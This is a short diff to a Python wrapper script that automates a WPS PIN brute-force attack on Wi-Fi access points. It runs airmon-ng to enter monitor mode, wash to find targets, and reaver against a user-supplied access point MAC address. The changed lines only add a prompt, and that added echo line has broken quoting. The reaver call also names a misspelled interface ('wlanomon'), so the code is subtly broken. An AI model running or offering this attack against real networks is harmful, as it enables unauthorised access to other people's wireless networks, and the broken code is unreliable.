@@ -6,7 +6,7 @@ os.system("clear")
 os.system("airmon-ng check kill")
 os.system("airmon-ng start wlan0")
 os.system("wash -i wlan0mon")
-
-MACinput=raw_input("Enter MAC Address for Accesspoint:")
+os.system("echo "Control+C when your done looking")
+MACinput=raw_input("\nEnter MAC Address for Accesspoint:")
 
 os.system("reaver -i wlanomon -b " + MACinput + " -d 30 -S -N -vv")
